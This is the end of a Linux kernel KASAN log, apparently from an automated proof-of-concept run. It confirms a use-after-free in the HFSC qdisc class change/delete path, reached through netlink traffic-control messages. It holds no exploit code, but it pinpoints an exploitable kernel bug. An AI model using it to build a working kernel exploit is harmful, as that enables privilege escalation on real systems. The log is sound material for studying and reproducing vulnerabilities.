[    1.110539]  ? clear_bhb_loop+0x40/0x90
[    1.110540]  do_syscall_64+0xa6/0x1b0
[    1.110542]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    1.110544] RIP: 0033:0x43bdc3
[    1.110545] Code: c7 c2 b8 ff ff ff f7 d8 64 89 02 48 c7 c0 ff ff ff ff eb b8 0f 1f 00 80 3d c1 02 07 00 00 41 89 ca 74 14 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 75 c3 0f 1f 40 00 55 48 83 ec 30 44 89 4c 24
[    1.110547] RSP: 002b:00007ffe447b5408 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[    1.110549] RAX: ffffffffffffffda RBX: 0000000000000004 RCX: 000000000043bdc3
[    1.110550] RDX: 0000000000000030 RSI: 00007ffe447b5460 RDI: 0000000000000004
[    1.110551] RBP: 00007ffe447b5460 R08: 00007ffe447b5420 R09: 0000000000000010
[    1.110552] R10: 0000000000000000 R11: 0000000000000202 R12: 00007ffe447b5420
[    1.110553] R13: 0000000000000003 R14: 000000000000002c R15: 00000000004ad32c
[    1.110554]  </TASK>
[    1.110555] 
[    1.124171] Allocated by task 67:
[    1.124307]  kasan_save_stack+0x33/0x60
[    1.124464]  kasan_save_track+0x14/0x30
[    1.124618]  __kasan_kmalloc+0x8f/0xa0
[    1.124769]  hfsc_change_class+0x55b/0x33e0
[    1.124940]  tc_ctl_tclass+0x46d/0x1450
[    1.125095]  rtnetlink_rcv_msg+0x364/0xa40
[    1.125259]  netlink_rcv_skb+0x12e/0x370
[    1.125417]  netlink_unicast+0x5c0/0x830
[    1.125574]  netlink_sendmsg+0x75a/0xc00
[    1.125732]  ____sys_sendmsg+0x823/0xa00
[    1.125891]  ___sys_sendmsg+0xff/0x180
[    1.126044]  __sys_sendmsg+0x11c/0x1b0
[    1.126196]  do_syscall_64+0xa6/0x1b0
[    1.126345]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    1.126546] 
[    1.126613] Freed by task 67:
[    1.126736]  kasan_save_stack+0x33/0x60
[    1.126892]  kasan_save_track+0x14/0x30
[    1.127046]  kasan_save_free_info+0x3b/0x60
[    1.127213]  __kasan_slab_free+0x37/0x50
[    1.127371]  kfree+0xcf/0x360
[    1.127495]  hfsc_delete_class+0x42a/0x740
[    1.127660]  tc_ctl_tclass+0xfbc/0x1450
[    1.127815]  rtnetlink_rcv_msg+0x364/0xa40
[    1.127981]  netlink_rcv_skb+0x12e/0x370
[    1.128138]  netlink_unicast+0x5c0/0x830
[    1.128295]  netlink_sendmsg+0x75a/0xc00
[    1.128452]  ____sys_sendmsg+0x823/0xa00
[    1.128610]  ___sys_sendmsg+0xff/0x180
[    1.128761]  __sys_sendmsg+0x11c/0x1b0
[    1.128914]  do_syscall_64+0xa6/0x1b0
[    1.129062]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    1.129262] 
[    1.129329] The buggy address belongs to the object at ffff88800a6e3000
[    1.129329]  which belongs to the cache kmalloc-1k of size 1024
[    1.129807] The buggy address is located 272 bytes inside of
[    1.129807]  freed 1024-byte region [ffff88800a6e3000, ffff88800a6e3400)
[    1.130280] 
[    1.130348] The buggy address belongs to the physical page:
[    1.130566] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0xa6e0
[    1.130869] head: order:3 mapcount:0 entire_mapcount:0 nr_pages_mapped:0 pincount:0
[    1.131175] flags: 0x100000000000040(head|node=0|zone=1)
[    1.131392] page_type: f5(slab)
[    1.131527] raw: 0100000000000040 ffff888006c41dc0 dead000000000122 0000000000000000
[    1.131831] raw: 0000000000000000 0000000080100010 00000000f5000000 0000000000000000
[    1.132133] head: 0100000000000040 ffff888006c41dc0 dead000000000122 0000000000000000
[    1.132436] head: 0000000000000000 0000000080100010 00000000f5000000 0000000000000000
[    1.132738] head: 0100000000000003 ffffea000029b801 00000000ffffffff 00000000ffffffff
[    1.133044] head: 0000000000000000 0000000000000000 00000000ffffffff 0000000000000000
[    1.133347] page dumped because: kasan: bad access detected
[    1.133565] 
[    1.133632] Memory state around the buggy address:
[    1.133822]  ffff88800a6e3000: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    1.134105]  ffff88800a6e3080: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    1.134386] >ffff88800a6e3100: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    1.134672]                          ^
[    1.134824]  ffff88800a6e3180: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    1.135107]  ffff88800a6e3200: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    1.135388] ==================================================================
[    1.135672] Disabling lock debugging due to kernel taint
poc: done (if we got here without a KASAN splat [    1.136252] poc (67) used greatest stack depth: 25616 bytes left
the kernel is patched)
---- poc end rc=0 ----
secb: poc exited without crashing the kernel
[    1.467244] input: ImExPS/2 Generic Explorer Mouse as /devices/platform/i8042/serio1/input/input3
[    2.388603] ACPI: PM: Preparing to enter system sleep state S5
[    2.388908] reboot: Power down
CONFIRMED: KASAN_UAF
